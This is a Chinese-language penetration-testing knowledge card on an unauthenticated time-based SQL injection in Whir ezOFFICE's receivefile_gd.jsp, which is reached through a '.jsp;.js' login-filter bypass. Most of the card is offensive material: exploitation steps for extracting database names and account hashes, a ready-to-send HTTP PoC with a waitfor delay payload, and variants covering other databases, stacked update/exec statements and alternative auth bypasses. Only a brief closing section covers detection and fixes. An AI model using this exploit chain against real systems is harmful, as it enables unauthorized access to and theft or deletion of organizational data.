---
id: web-generic-sqli-whir-ezoffice-receivefile-gd-recordid
title: 万户 ezOFFICE receivefile_gd.jsp recordId 未授权 SQL 注入：HashMap→EJB→wf_onlineuser 删除语句拼接
type: scenario
domain: web
path: web/generic/sqli
technique: whir-ezoffice-receivefile-gd-recordid-sqli
tags:
- web
- sqli
- java
- oa
- whir
- ezoffice
- jsp
- unauth
- time-based
- mssql
- jdbc
- string-concat
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V274
  verified_at: '2026-11-07T23:46:37+08:00'
  notes: 已对照原文核对：receivefile_gd.jsp在gd为空时else分支把recordId/tableId/processId/workId放入HashMap、WorkFlowButtonBD.delWFOnlineUser→ParameterGenerator/EJBProxy.invoke→WorkFlowButtonEJBBean.delWFOnlineUser反射链、delete from wf_onlineuser where recordId=拼接、SetCharacterEncodingFilter按getRequestURI最后一个点取后缀且.jsp;.js取成.js跳过session校验、waitfor delay '0:0:6'响应6088ms/395字节均与正文及img01-14一致。未重新请求目标。
url: /docs/web/generic/sqli/web-generic-sqli-whir-ezoffice-receivefile-gd-recordid/
draft: false
kb_aliases:
- 万户OA receivefile_gd.jsp 注入
- ezOFFICE recordId SQL 注入
- WorkFlowButtonEJBBean delWFOnlineUser
- wf_onlineuser 注入
- jsp;.js 未授权注入
- waitfor delay 时间盲注
---

## 一句话结论

万户 ezOFFICE 的 `receivefile_gd.jsp` 在 `gd` 参数为空时进入 else 分支，把 `recordId`（以及 `tableId`/`processId`/`workId`）原样放进 HashMap，经 `WorkFlowButtonBD.delWFOnlineUser → EJBProxy.invoke → WorkFlowButtonEJBBean.delWFOnlineUser` 反射调用，最终拼进 `delete from wf_onlineuser where recordId=<值> and tableId=...`；配合 `.jsp;.js` 绕过 `SetCharacterEncodingFilter` 的登录校验，未登录即可用 `recordId=1;waitfor delay '0:0:6'-- -` 做时间盲注（实测响应约 6 秒）。

## 原理

- **入口**：`/defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp` 判断 `gd` 是否为空，为空进入 else 分支；JSP 里 `java.util.Map myParaTmp = new java.util.HashMap(); myParaTmp.put("recordId", request.getParameter("recordId"));`（以及 tableId、processId、workId）没有任何过滤或类型转换。
- **反射调用链**：`WorkFlowButtonBD.delWFOnlineUser(Map para)` 用 `ParameterGenerator(1)` 把 `{para, Map.class}` 放入二维对象数组，再 `new WorkFlowEJBProxy("WorkFlowButtonEJB", "WorkFlowButtonEJBLocal", WorkFlowButtonEJBHome.class).invoke("delWFOnlineUser", parameters)`。
- `EJBProxy.invoke` 从 parameters 还原 `parameterClasses=[Map.class]`、`parameterValues=[para]`，执行 `this.classInstance.getClass().getMethod("delWFOnlineUser", parameterClasses).invoke(classInstance, parameterValues)`；`classInstance` 由 `remoteHomeInterface.getName()` 截包名后拼 `WorkFlowButtonEJB` + `Bean`，得到 `com.whir.ezoffice.workflow.newEJB.WorkFlowButtonEJBBean` 并 `newInstance`。这条 EJB 代理/反射链只是调用通道，不是安全边界。
- **SQL sink**：`WorkFlowButtonEJBBean.delWFOnlineUser` 使用 `"delete from wf_onlineuser where recordId=" + var1.get("recordId") + " and tableId=" + var1.get("tableId") + ...` 拼接 SQL 并 `stmt.execute(var2)`。`recordId` 处于数字上下文，可直接注入 `;waitfor delay '0:0:6'-- -`、`and 1=1`、`union select` 等。
- **鉴权绕过**：`SetCharacterEncodingFilter` 用 `getRequestURI()` 的最后一个 `.` 取后缀，只有后缀为空、`.jsp`、`.vm` 时才进入 session 校验；请求 `receivefile_gd.jsp;.js` 的后缀被取成 `.js`，跳过鉴权。Tomcat 把 `;` 后内容当作路径参数，JSP servlet 仍映射到 `receivefile_gd.jsp`，因此未登录可达。
- **时间盲注验证**：`waitfor delay '0:0:6'` 在 MSSQL 中同步等待 6 秒；原文请求返回 200、响应约 6088ms（正常页面 395 字节、毫秒级），确认为时间型注入。

## 触发条件

- 目标为万户 ezOFFICE，`/defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp` 可达且 `gd` 参数为空/未设置。
- 数据库为 SQL Server（`waitfor delay`）；其他数据库需换对应时间/布尔原语。
- 目标容器支持 `;` 路径参数，且 `SetCharacterEncodingFilter` 未修复（或使用其他已知鉴权绕过）。
- 应用账号对 `wf_onlineuser` 有 DELETE 权限（语句本身是 delete）。

## 利用步骤

1. 未登录访问 `GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=1`，确认返回业务页面而非登录跳转。
2. 传 `recordId=1;waitfor+delay+'0:0:6'--+-`，对比正常响应时间（约 6 秒 vs 数百毫秒）确认时间盲注。
3. 用条件化 `waitfor delay` 或布尔表达式构造盲注，逐段提取库名、表名、账号哈希等。
4. 同一 HashMap 中的 `tableId`、`processId`、`workId` 也来自请求并进入同一删除语句，可分别测试是否同样可注入。
5. 记录请求、响应时间差、数据库类型与代码路径证据；控制数据读取范围。

## PoC

```http
GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:6'--+- HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
```

```text
# 预期：HTTP/1.1 200，响应时间约 6 秒（原文 6088ms，正常页面 395 字节）。
# 其他参数（tableId/processId/workId）同样来自请求并进入同一 Map，可分别测试。
```

## 变体与关联

- 变体：数据库非 MSSQL 时改用 `and sleep(6)`、`pg_sleep(6)`、`dbms_pipe.receive_message` 等；数字上下文直接接 `and` 或 `;`。
- 变体：`tableId`/`processId`/`workId` 也可能拼接，可逐个确认；若驱动支持堆叠，可测试 `;update/exec` 等其他语句。
- 变体：鉴权绕过可换 `iWebOfficeSign/OfficeServer.jsp/../../` 特征路径或 XFF 白名单，见关联卡。
- 关联：[[web-generic-auth-whir-ezoffice-characterencoding-filter-bypass]]（`.jsp;.js`、特征路径、XFF 三种绕过）、[[web-generic-sqli-whir-ezoffice-jsp-concat-three]]（同一产品的另三处 JSP 拼接注入；本卡是 receivefile_gd.jsp + EJB 删除语句的新 sink）、[[web-generic-sqli-oa-jsp-orderby-sort-updatexml]]（OA JSP 注入同类思路）。
- 边界：JSP 被删除或改为参数化、过滤器修复、数据库不支持 `waitfor`/堆叠时，注入类型与危害相应变化。

## 检测与防御

- 检测：请求路径出现 `.jsp;.js`、`;` 路径参数；`recordId` 含 `;`、`waitfor`、`delay`、`and`、`or`、注释符；同一 IP 对 `receivefile_gd.jsp` 的 `recordId` 高频请求且响应时间异常。
- 修复：JSP 与 EJB 方法中所有 SQL 改为 `PreparedStatement`/参数绑定，`recordId` 强制做整数解析；`SetCharacterEncodingFilter` 按归一化路径和精确后缀鉴权。
- 加固：在容器/代理层拒绝含 `;` 的路径参数；数据库账户最小权限；关闭详细错误回显；WAF 仅作辅助，不能替代参数化。
